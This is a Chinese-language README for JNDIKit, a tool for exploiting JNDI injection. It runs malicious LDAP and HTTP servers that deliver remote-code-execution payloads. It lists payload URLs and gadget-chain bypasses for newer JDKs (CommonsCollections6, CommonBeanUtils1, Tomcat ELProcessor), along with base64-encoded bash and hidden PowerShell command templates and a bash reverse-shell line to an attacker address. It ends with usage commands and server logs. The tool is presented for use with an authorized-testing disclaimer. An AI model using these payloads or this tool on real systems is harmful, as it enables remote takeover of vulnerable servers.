# JNDIKit

![](https://img.shields.io/badge/build-passing-brightgreen)
![](https://img.shields.io/badge/Java-8-red)

**工具仅用于安全研究以及内部自查，禁止使用工具发起非法攻击，造成的后果使用者负责**

## 介绍

一款简单的`JNDI`注入利用工具（自用）

并没有多少高级功能，主要是一些基本的功能，供安全研究使用

无需自行编译`Java`代码和开启`HTTP`服务，一切自动

| Payload                               | 介绍                                        |
|---------------------------------------|-------------------------------------------|
| ldap://0.0.0.0:1389/SimpleCommand     | 直接执行命令                                    |   
| ldap://0.0.0.0:1389/BashCommand       | 使用bash并进行Base64编码执行命令                     |
| ldap://0.0.0.0:1389/PowershellCommand | 使用powershell并进行Base64编码执行命令               |
| ldap://0.0.0.0:1389/CC6               | 使用CommonsCollections6绕过高版本JDK             |
| ldap://0.0.0.0:1389/BashCC6           | 使用CommonsCollections6绕过高版本JDK（bash）       |
| ldap://0.0.0.0:1389/PowershellCC6     | 使用CommonsCollections6绕过高版本JDK（powershell） |
| ldap://0.0.0.0:1389/CB1               | 使用CommonBeanUtils1绕过高版本JDK                |
| ldap://0.0.0.0:1389/BashCB1           | 使用CommonBeanUtils1绕过高版本JDK（bash）          |
| ldap://0.0.0.0:1389/PowershellCB1     | 使用CommonBeanUtils1绕过高版本JDK（powershell）    |
| ldap://0.0.0.0:1389/Tomcat            | 使用Tomcat ELProcessor绕过高版本JDK              |
| ldap://0.0.0.0:1389/BashTomcat        | 使用Tomcat ELProcessor绕过高版本JDK（bash）        |
| ldap://0.0.0.0:1389/PowershellTomcat  | 使用Tomcat ELProcessor绕过高版本JDK（powershell）  |

支持三种格式的`RCE`
- 直接执行：`Runtime.getRuntime.exec(command);`
- 使用`bash`并编码：`bash -c {echo,[Payload]}|{base64,-d}|{bash,-i}`
- 使用`powershell`并编码：`powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc [Payload]`

为什么需要对命令进行特殊处理： 

例如`linux`下执行反弹`shell`命令会失败：`bash -i >& /dev/tcp/x.x.x.x/port 0>&1`

因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义，所以需要进行特殊处理

支持一些绕过高版本`JDK`的方式（同样支持三种格式的`RCE`）

- 打本地`gadget`的`CB1`和`CC6`链
- 利用`Tomcat ELProcessor`的绕过

## 使用

命令：`java -jar JNDIKit.jar --cmd calc.exe`

```text
    ___  ________   ________  ___  ___  __    ___  _________   
   |\  \|\   ___  \|\   ___ \|\  \|\  \|\  \ |\  \|\___   ___\ 
   \ \  \ \  \\ \  \ \  \_|\ \ \  \ \  \/  /|\ \  \|___ \  \_| 
 __ \ \  \ \  \\ \  \ \  \ \\ \ \  \ \   ___  \ \  \   \ \  \  
|\  \\_\  \ \  \\ \  \ \  \_\\ \ \  \ \  \\ \  \ \  \   \ \  \ 
\ \________\ \__\\ \__\ \_______\ \__\ \__\\ \__\ \__\   \ \__\
 \|________|\|__| \|__|\|_______|\|__|\|__| \|__|\|__|    \|__|                                                                 
20:31:33 [INFO] [org.sec.Main] start jndi kit
20:31:33 [INFO] [org.sec.Main] cmd: calc.exe
20:31:33 [INFO] [org.sec.core.http.HttpServer] start http server: 0.0.0.0:8000
20:31:33 [INFO] [org.sec.core.ldap.LdapServer] start ldap server: 0.0.0.0:1389
┌─────────────────────────────────────┬────────────────────────────────────────────────────┐
│LDAP Payload                         │Introduce                                           │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/SimpleCommand    │Simple RCE                                          │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/BashCommand      │Simple RCE Use Bash                                 │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/PowershellCommand│Simple RCE Use Powershell                           │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/CC6              │RCE Use CC6 Payload (Simple)                        │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/BashCC6          │RCE Use CC6 Payload (Bash)                          │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/PowershellCC6    │RCE Use CC6 Payload (Powershell)                    │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/CB1              │RCE Use CB1 Payload (Simple)                        │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/BashCB1          │RCE Use CB1 Payload (Bash)                          │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/PowershellCB1    │RCE Use CB1 Payload (Powershell)                    │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/Tomcat           │Use Tomcat ELProcessor Bypass JDK 8u191 (Simple)    │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/BashTomcat       │Use Tomcat ELProcessor Bypass JDK 8u191 (Bash)      │
├─────────────────────────────────────┼────────────────────────────────────────────────────┤
│ldap://0.0.0.0:1389/PowershellTomcat │Use Tomcat ELProcessor Bypass JDK 8u191 (Powershell)│
└─────────────────────────────────────┴────────────────────────────────────────────────────┘
```

如果端口冲突可自行配置端口

命令：`java -jar JNDIKit.jar --cmd calc.exe --lp 1390 --hp 8001`

接收到请求会实时打印

```text
20:53:21 [INFO] [org.sec.core.ldap.LdapServer] Accept 127.0.0.1 -----> SimpleCommand
20:53:30 [INFO] [org.sec.core.ldap.LdapServer] Accept 127.0.0.1 -----> PowershellCommand
20:53:42 [INFO] [org.sec.core.ldap.LdapServer] Accept 127.0.0.1 -----> PowershellCC6
20:53:51 [INFO] [org.sec.core.ldap.LdapServer] Accept 127.0.0.1 -----> PowershellTomcat
```

## 免责申明

**未经授权许可使用`JNDIKit`攻击目标是非法的**

**本程序应仅用于授权的安全测试与研究目的**


